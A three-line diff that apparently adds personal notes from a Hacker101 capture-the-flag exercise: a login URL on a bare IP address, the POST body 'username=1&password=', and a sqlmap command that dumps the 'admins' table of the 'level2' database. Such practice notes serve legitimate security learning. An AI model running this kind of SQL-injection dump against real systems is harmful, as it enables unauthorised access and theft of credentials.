@@ -1,0 +1,3 @@
+http://34.74.105.127:80/bedc4e1dcc/login (POST)  # sqlmap.py -r /home/krcy/Works/ctf/hacker101/1.txt -D level2 -T admins --dump --random-agent --threads 10
+
+username=1&password=
